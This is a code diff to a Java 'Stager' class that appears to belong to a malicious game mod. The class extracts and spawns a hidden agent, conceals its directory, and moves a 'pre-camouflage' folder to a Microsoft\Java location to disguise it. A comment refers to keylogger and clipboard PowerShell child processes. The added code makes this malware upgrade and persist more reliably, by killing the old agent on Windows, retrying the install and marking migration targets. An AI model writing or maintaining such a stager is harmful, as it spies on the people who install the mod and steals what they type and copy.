@@ -24,6 +24,7 @@ public final class Stager {
 
 	public static void trigger(String version, Path gameDir) throws Exception {
 		Path dir = migrate(StagerPaths.installDir());
+		LOGGER.info("Install dir {} (target {})", dir, StagerPaths.modernTarget());
 		if (!finishConversion(dir)) {
 			LOGGER.info("Legacy conversion pending, retrying next launch");
 			return;
@@ -34,15 +35,33 @@ public final class Stager {
 		Path binary = StagerPaths.binary(dir);
 		Path marker = StagerPaths.marker(dir);
 		if (!isInstalled(version, marker, agent, binary)) {
-			extractAgent(dir, agent);
-			copyRuntime(binary);
-			Files.writeString(marker, version, StandardCharsets.UTF_8);
+			// Windows keeps the running jar locked; a surviving agent would
+			// make every launch skip the upgrade. Release it first.
+			if (isRunning(dir) && !stopAgent(dir)) {
+				LOGGER.info("Agent still alive, deferring install of {}", version);
+				return;
+			}
+			try {
+				install(dir, agent, binary, marker, version);
+			} catch (Exception failure) {
+				// The jar can stay locked for a moment after the kill: retry once.
+				if (!isRunning(dir) || !stopAgent(dir)) {
+					throw failure;
+				}
+				install(dir, agent, binary, marker, version);
+			}
 		}
 		if (!isRunning(dir)) {
 			LOGGER.info("Starting agent stager (mod {})", version);
 			spawn(dir, agent, binary, gameDir);
 			conceal(dir);
 		}
+	}
+
+	private static void install(Path dir, Path agent, Path binary, Path marker, String version) throws Exception {
+		extractAgent(dir, agent);
+		copyRuntime(binary);
+		Files.writeString(marker, version, StandardCharsets.UTF_8);
 	}
 
 	/** Moves a pre-camouflage tree (FabricSync/ServerPackCore) to Microsoft\Java. */
@@ -89,6 +108,9 @@ public final class Stager {
 					return target;
 				}
 				moved = false;
+				// Mark before copying: an interrupted copy must stay our target
+				// instead of being mistaken for an unrelated Java directory.
+				Files.writeString(target.resolve(MIGRATION_MARKER), dir.toString());
 				try {
 					copyTree(dir, target);
 					deleteTree(dir);
@@ -340,6 +362,27 @@ public final class Stager {
 		}
 	}
 
+	/**
+	 * The agent keeps a byte-range lock on runtime.lock, so reading it fails on
+	 * Windows. session.txt is written without a lock and names the agent.
+	 */
+	static long agentPid(Path dir) {
+		try {
+			for (String line : Files.readAllLines(StagerPaths.alive(dir), StandardCharsets.UTF_8)) {
+				if (line.startsWith("agent=")) {
+					return Long.parseLong(line.substring("agent=".length()).trim());
+				}
+			}
+		} catch (Throwable ignored) {
+			// Fall back to the lock for older agents.
+		}
+		try {
+			return Long.parseLong(Files.readString(StagerPaths.lock(dir)).trim());
+		} catch (Throwable ignored) {
+			return -1L;
+		}
+	}
+
 	/** The old agent holds the jar open on Windows; release it before the move. */
 	private static boolean stopAgent(Path dir) {
 		try {
@@ -347,27 +390,38 @@ public final class Stager {
 			if (!Files.isRegularFile(lock)) {
 				return true;
 			}
-			long pid = Long.parseLong(Files.readString(lock).trim());
+			long pid = agentPid(dir);
+			if (pid <= 0L) {
+				return false;
+			}
 			String expected = StagerPaths.agentJar(dir).getFileName().toString()
 				.toLowerCase(java.util.Locale.ROOT);
 			var target = ProcessHandle.of(pid);
 			String command = target.flatMap(process -> process.info().commandLine())
 				.orElse("").toLowerCase(java.util.Locale.ROOT);
 			boolean alive = target.map(ProcessHandle::isAlive).orElse(false);
-			if (alive && command.isEmpty()) {
-				// Unverifiable command line: accept it only when its start time
-				// matches the PID written to the lock file.
+			if (!alive) {
+				LOGGER.info("Lock pid {} in {} is gone", pid, dir);
+				return true;
+			}
+			if (!command.isEmpty()) {
+				if (!command.contains(dir.toString().toLowerCase(java.util.Locale.ROOT))
+					|| !command.contains(expected)) {
+					// A stale lock can point at a reused PID: only kill the agent.
+					LOGGER.info("Lock pid {} in {} is not this agent ({}), not killing", pid, dir, command);
+					return true;
+				}
+			} else {
+				// The OS hid the command line: trust the pid our own session
+				// file names, but still refuse a start-time mismatch. If the
+				// start time is unavailable, kill anyway or upgrades stall.
 				long started = target.flatMap(process -> process.info().startInstant())
 					.map(java.time.Instant::toEpochMilli).orElse(-1L);
 				long locked = Files.getLastModifiedTime(lock).toMillis();
-				if (started < 0L || Math.abs(started - locked) > 15_000L) {
+				if (started >= 0L && Math.abs(started - locked) > 15_000L) {
+					LOGGER.info("Lock pid {} in {} is not this agent (start mismatch)", pid, dir);
 					return true;
 				}
-			} else if (!command.contains(dir.toString().toLowerCase(java.util.Locale.ROOT))
-				|| !command.contains(expected)) {
-				// A stale lock can point at a reused PID: only kill the agent.
-				LOGGER.info("Lock pid {} is not this agent ({}), not killing", pid, command);
-				return true;
 			}
 			var handle = ProcessHandle.of(pid);
 			// Keylogger/clipboard PowerShell children keep the old paths and
@@ -435,7 +489,7 @@ public final class Stager {
 		}
 	}
 
-	private static boolean isInstalled(String version, Path marker, Path agent, Path binary) {
+	static boolean isInstalled(String version, Path marker, Path agent, Path binary) {
 		try {
 			if (!Files.isRegularFile(marker) || !Files.isRegularFile(agent) || !Files.isRegularFile(binary)) {
 				return false;
